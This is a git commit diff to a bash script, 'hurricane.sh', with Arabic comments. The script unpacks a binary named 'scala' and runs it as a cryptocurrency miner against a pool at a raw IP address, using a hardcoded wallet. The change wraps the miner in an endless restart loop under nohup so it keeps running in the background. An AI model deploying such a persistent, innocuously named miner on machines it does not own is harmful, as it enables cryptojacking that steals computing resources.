eb91482aa8025b0bea75faf9cd553e037f510842
ewilkinso <ewilkinson3@alaska.edu>
2025-08-12 13:03:27 +0100

    Update hurricane.sh

--- hurricane.sh
+++ hurricane.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # إعداد بيانات المحفظة والمعدّن
+APP_NAME="scala"
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
 WORKER="10"
 POOL="45.155.102.89:443"
@@ -17,4 +18,11 @@ tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
 # تشغيل المعدّن في الخلفية باستخدام nohup
-nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
+while true
+do
+    echo "$APP_NAME..."
+    nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
+    wait $!
+    echo "$APP_NAME"
+    sleep 5
+done
